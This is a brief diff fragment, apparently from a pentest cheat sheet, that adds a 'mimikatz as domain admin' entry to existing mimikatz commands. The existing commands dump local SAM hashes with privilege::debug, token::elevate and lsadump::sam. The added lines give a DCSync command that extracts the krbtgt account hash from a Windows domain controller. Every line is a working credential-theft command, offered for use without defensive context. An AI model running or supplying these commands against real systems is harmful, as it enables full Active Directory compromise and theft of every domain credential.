@@ -230,3 +230,9 @@ privilege::debug
 token::elevate
 lsadump::sam
 ```
+
+mimikatz as domain admin:
+#mimikatz #dcsync #dc-sync #krbtgt
+```powershell
+lsadump::dcsync /user:corp\krbtgt
+```
